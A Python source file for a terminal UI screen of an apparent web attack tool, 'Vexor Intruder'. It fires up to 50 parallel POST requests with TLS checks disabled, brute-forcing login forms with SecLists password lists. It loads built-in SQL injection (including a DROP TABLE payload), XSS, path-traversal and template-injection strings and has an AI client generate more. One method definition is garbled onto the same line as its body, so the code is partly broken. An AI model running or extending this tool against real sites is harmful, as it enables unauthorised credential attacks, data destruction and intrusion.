"""
Vexor Intruder Screen v2.0.0 — Very Fast, 50 parallel requests
"""
from textual.app import ComposeResult
from textual.widget import Widget
from textual.widgets import Static, Input, Button, DataTable, Log, TextArea, Select, ProgressBar
from textual.containers import Horizontal, Vertical, Container
from textual import work
from textual.reactive import reactive
import asyncio
import time


ATTACK_TYPES = [
    ("sniper", "Sniper — Single position"),
    ("battering_ram", "Battering Ram — All positions"),
    ("pitchfork", "Pitchfork — Parallel payloads"),
    ("cluster_bomb", "Cluster Bomb — All combinations"),
]


class IntruderScreen(Widget):

    DEFAULT_CSS = """
    IntruderScreen {
        background: #0a0a0f;
        padding: 0 1;
        overflow-y: auto;
    }
    .intruder-title {
        height: 2;
        color: #00ffff;
        text-style: bold;
    }
    .config-section {
        border: solid #1a1a2e;
        padding: 1;
        margin-bottom: 1;
        height: auto;
    }
    .template-area {
        height: 6;
        margin-bottom: 1;
    }
    .attack-btn-row {
        height: 3;
        margin-top: 1;
    }
    .payload-section {
        border: solid #ff00ff;
        padding: 1;
        margin-bottom: 1;
        height: 14;
    }
    .payload-area {
        height: 8;
    }
    .payload-btn-col {
        width: 20;
        padding-left: 1;
    }
    .progress-section {
        height: 4;
        border: solid #1a1a2e;
        padding: 0 1;
        margin-bottom: 1;
    }
    .results-table {
        height: 14;
        border: solid #1a1a2e;
        margin-bottom: 1;
    }
    .attack-log {
        height: 6;
        border: solid #1a1a2e;
    }
    """

    attacking = reactive(False)

    def compose(self) -> ComposeResult:
        yield Static(
            "[bold bright_cyan]◈ INTRUDER[/]  "
            "[dim]50 Parallel Requests · Smart Interesting Detection[/]",
            classes="intruder-title"
        )

        with Container(classes="config-section"):
            yield Static("[bold bright_magenta]Attack Configuration[/]")
            yield Input(placeholder="https://target.com/login", id="intruder-url")
            yield Static("[dim]Request Template (mark positions with §payload§):[/]")
            yield TextArea(
                "POST /login HTTP/1.1\nHost: target.com\n\nusername=§admin§&password=§password§",
                id="request-template",
                classes="template-area"
            )
            with Horizontal(classes="attack-btn-row"):
                yield Select(
                    [(label, val) for val, label in ATTACK_TYPES],
                    id="attack-type",
                    value="sniper"
                )
                yield Button("▶ Start Attack", id="btn-start-attack", classes="success")
                yield Button("■ Stop", id="btn-stop-attack", classes="danger")
                yield Button("🤖 AI Payloads", id="btn-ai-payloads")

        with Container(classes="payload-section"):
            yield Static("[bold bright_magenta]Payloads[/]  [dim](One per line)[/]")
            with Horizontal():
                yield TextArea(
                    "admin\nroot\ntest\nuser\nadministrator",
                    id="payload-list",
                    classes="payload-area"
                )
                with Vertical(classes="payload-btn-col"):
                    yield Button("📂 Load File", id="btn-load-file")
                    yield Button("📚 Built-in", id="btn-builtin")
                    yield Button("🤖 AI Gen", id="btn-ai-generate")

        # Progress section
        with Container(classes="progress-section"):
            yield Static(
                "[dim]Ready — 0/0 requests[/]",
                id="progress-label"
            )
            yield ProgressBar(total=100, show_eta=False, id="attack-progress")
            yield Static(
                "[dim]0 req/s  ·  0 interesting  ·  0 errors[/]",
                id="stats-label"
            )

        yield Static("[bold bright_magenta]◈ RESULTS[/]  [dim](sorted: interesting first)[/]")
        table = DataTable(classes="results-table", id="intruder-results")
        table.add_columns("#", "Payload", "Status", "Length", "Time(ms)", "⚑ Interesting")
        yield table

        yield Static("[bold bright_magenta]◈ LOG[/]")
        yield Log(classes="attack-log", id="attack-log")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "btn-start-attack":
            self.start_attack()
        elif event.button.id == "btn-stop-attack":
            self.attacking = False
        elif event.button.id in ("btn-ai-payloads", "btn-ai-generate"):
            self.generate_ai_payloads()
        elif event.button.id == "btn-builtin":
            self._load_builtin_payloads("general")
        elif event.button.id == "btn-load-file":
            self._load_seclists()

    @work(exclusive=True)
    async def start_attack(self) -> None:
        url = self.query_one("#intruder-url", Input).value
        payloads_text = self.query_one("#payload-list", TextArea).text
        payloads = [p.strip() for p in payloads_text.split("\n") if p.strip()]
        log = self.query_one("#attack-log", Log)
        table = self.query_one("#intruder-results", DataTable)
        progress_bar = self.query_one("#attack-progress", ProgressBar)
        progress_label = self.query_one("#progress-label", Static)
        stats_label = self.query_one("#stats-label", Static)

        if not url or not payloads:
            self.notify("Enter URL and payloads", severity="error")
            return

        if not url.startswith("http"):
            url = f"https://{url}"

        self.attacking = True
        table.clear()
        progress_bar.update(total=len(payloads), progress=0)

        log.write_line(f"[*] Target: {url}")
        log.write_line(f"[*] {len(payloads)} payloads | 50 concurrent workers")

        import httpx

        semaphore = asyncio.Semaphore(50)
        results = []
        completed = 0
        interesting_count = 0
        error_count = 0
        start_time = time.time()

        # Collect all status codes first to detect anomalies
        status_counter: dict[int, int] = {}

        async def attack_single(i: int, payload: str):
            nonlocal completed, interesting_count, error_count

            async with semaphore:
                if not self.attacking:
                    return

                t0 = time.time()
                try:
                    async with httpx.AsyncClient(
                        verify=False, timeout=10, follow_redirects=True
                    ) as client:
                        resp = await client.post(
                            url,
                            data={
                                "payload": payload,
                                "username": payload,
                                "password": payload,
                            },
                            headers={"User-Agent": "Vexor/2.0 Intruder"},
                        )
                        elapsed_ms = int((time.time() - t0) * 1000)
                        length = len(resp.content)
                        status = resp.status_code

                        # Track status distribution
                        status_counter[status] = status_counter.get(status, 0) + 1

                        results.append((i, payload, status, length, elapsed_ms))

                except Exception as e:
                    elapsed_ms = int((time.time() - t0) * 1000)
                    error_count += 1
                    results.append((i, payload, 0, 0, elapsed_ms))

                completed += 1

                # Update progress
                elapsed_total = time.time() - start_time
                rps = completed / elapsed_total if elapsed_total > 0 else 0
                pct = int((completed / len(payloads)) * 100)
                progress_bar.update(progress=completed)
                progress_label.update(
                    f"[bright_cyan]{completed}/{len(payloads)} requests[/]  "
                    f"[dim]{pct}% complete[/]"
                )
                stats_label.update(
                    f"[bright_green]{rps:.1f} req/s[/]  ·  "
                    f"[bright_yellow]{interesting_count} interesting[/]  ·  "
                    f"[bright_red]{error_count} errors[/]"
                )

        # Launch all attacks concurrently
        tasks = [attack_single(i, p) for i, p in enumerate(payloads)]
        await asyncio.gather(*tasks, return_exceptions=True)

        # Determine "interesting" based on anomalies
        # Find the most common status code
        if status_counter:
            dominant_status = max(status_counter, key=lambda k: status_counter[k])
            dominant_length_list = [
                r[3] for r in results if r[2] == dominant_status and r[3] > 0
            ]
            avg_length = (
                sum(dominant_length_list) / len(dominant_length_list)
                if dominant_length_list else 0
            )
        else:
            dominant_status = 200
            avg_length = 0

        # Classify results
        classified = []
        for i, payload, status, length, elapsed_ms in results:
            interesting = ""
            interesting_score = 0

            # Different status from majority
            if status != dominant_status and status != 0:
                if status == 200:
                    interesting = "🔓 Auth bypass?"
                    interesting_score = 10
                elif status in (301, 302):
                    interesting = "🔀 Redirect"
                    interesting_score = 5
                elif status == 500:
                    interesting = "💥 Server error"
                    interesting_score = 8
                else:
                    interesting = f"⚠ Status {status}"
                    interesting_score = 3

            # Significantly different length
            if avg_length > 0 and length > 0:
                diff_pct = abs(length - avg_length) / avg_length
                if diff_pct > 0.2 and not interesting:
                    interesting = f"📏 Len diff {int(diff_pct*100)}%"
                    interesting_score = max(interesting_score, 4)

            # Slow response (possible time-based SQLi)
            if elapsed_ms > 3000:
                interesting = "⏱ Slow response"
                interesting_score = max(interesting_score, 7)

            if interesting:
                interesting_count += 1

            classified.append((i, payload, status, length, elapsed_ms, interesting, interesting_score))

        # Sort: interesting first, then by index
        classified.sort(key=lambda x: (-x[6], x[0]))

        # Populate table
        table.clear()
        for i, payload, status, length, elapsed_ms, interesting, _ in classified:
            if status == 0:
                status_str = "[bright_red]ERR[/]"
            elif status == 200:
                status_str = f"[bright_green]{status}[/]"
            elif status in (301, 302):
                status_str = f"[bright_yellow]{status}[/]"
            elif status >= 400:
                status_str = f"[bright_red]{status}[/]"
            else:
                status_str = str(status)

            table.add_row(
                str(i + 1),
                payload[:30],
                status_str,
                str(length),
                str(elapsed_ms),
                interesting,
            )

        elapsed_total = time.time() - start_time
        rps = len(payloads) / elapsed_total if elapsed_total > 0 else 0
        log.write_line(
            f"[+] Done! {len(results)} requests in {elapsed_total:.1f}s "
            f"({rps:.1f} req/s) | {interesting_count} interesting"
        )
        self.attacking = False

    @work(exclusive=True)
    async def generate_ai_payloads(self) -> None:
        url = self.query_one("#intruder-url", Input).value
        template = self.query_one("#request-template", TextArea).text

        self.notify("Generating context-aware AI payloads...", severity="information")
        try:
            from vexor.ai.client import AIClient
            client = AIClient()

            context = f"URL: {url}\nRequest template: {template[:200]}"
            payload_type = "general"
            template_lower = template.lower()
            if "username" in template_lower or "password" in template_lower:
                payload_type = "auth_bypass"
            elif "search" in template_lower or "q=" in template_lower:
                payload_type = "xss"
            elif "id=" in template_lower or "user_id" in template_lower:
                payload_type = "sqli"

            payloads = await client.generate_payloads(
                target=context, payload_type=payload_type, count=25
            )

            if payloads:
                unique_payloads = list(dict.fromkeys(payloads))
                self.query_one("#payload-list", TextArea).load_text(
                    "\n".join(unique_payloads)
                )
                self.notify(
                    f"Generated {len(unique_payloads)} unique payloads!",
                    severity="information",
                )
            else:
                self._load_builtin_payloads(payload_type)
        except Exception as e:
            self.notify(f"AI error: {str(e)[:50]}", severity="error")
            self._load_builtin_payloads("general")

    def _load_builtin_payloads(self, payload_type: str) -> None:        builtin = {
            "auth_bypass": [
                "admin", "administrator", "root", "test", "guest",
                "' OR '1'='1", "' OR 1=1--", "admin'--",
                "admin' #", "' OR 'x'='x", "1' OR '1'='1",
            ],
            "sqli": [
                "'", "''", "' OR 1=1--", "' OR '1'='1",
                "1 UNION SELECT NULL--", "' AND SLEEP(3)--",
                "1; DROP TABLE users--", "' OR 1=1#",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "'><script>alert(1)</script>",
            ],
            "general": [
                "' OR 1=1--", "<script>alert(1)</script>",
                "../../../etc/passwd", "{{7*7}}",
                "admin", "password", "test123",
                "' AND SLEEP(3)--", "<img src=x onerror=alert(1)>",
            ],
        }
        payloads = builtin.get(payload_type, builtin["general"])
        self.query_one("#payload-list", TextArea).load_text("\n".join(payloads))
        self.notify(f"Loaded {len(payloads)} built-in payloads", severity="information")

    @work(exclusive=False)
    async def _load_seclists(self) -> None:
        """
        Feature 4: SecLists Integration
        Downloads and uses community wordlists from SecLists GitHub.
        Falls back to built-in payloads if download fails.
        """
        SECLISTS = {
            "passwords": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
            "usernames": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
            "sqli":      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt",
            "xss":       "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt",
            "dirs":      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
            "lfi":       "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt",
        }

        # Detect best list based on request template
        template = self.query_one("#request-template", TextArea).text.lower()
        url = self.query_one("#intruder-url", Input).value.lower()

        if "password" in template or "login" in url:
            list_name, list_url = "passwords", SECLISTS["passwords"]
        elif "username" in template or "user" in template:
            list_name, list_url = "usernames", SECLISTS["usernames"]
        elif "search" in template or "q=" in template:
            list_name, list_url = "xss", SECLISTS["xss"]
        elif "id=" in template or "sql" in template:
            list_name, list_url = "sqli", SECLISTS["sqli"]
        else:
            list_name, list_url = "passwords", SECLISTS["passwords"]

        self.notify(f"Downloading SecLists/{list_name}...", severity="information")

        try:
            import httpx as _httpx
            async with _httpx.AsyncClient(timeout=15) as client:
                resp = await client.get(list_url)
                if resp.status_code == 200:
                    lines = [
                        l.strip() for l in resp.text.splitlines()
                        if l.strip() and not l.startswith("#")
                    ][:500]  # Cap at 500 for performance
                    self.query_one("#payload-list", TextArea).load_text("\n".join(lines))
                    self.notify(
                        f"SecLists/{list_name}: {len(lines)} payloads loaded",
                        severity="information",
                    )
                else:
                    raise Exception(f"HTTP {resp.status_code}")
        except Exception as e:
            self.notify(f"Download failed ({e}) — using built-in", severity="warning")
            self._load_builtin_payloads("general")
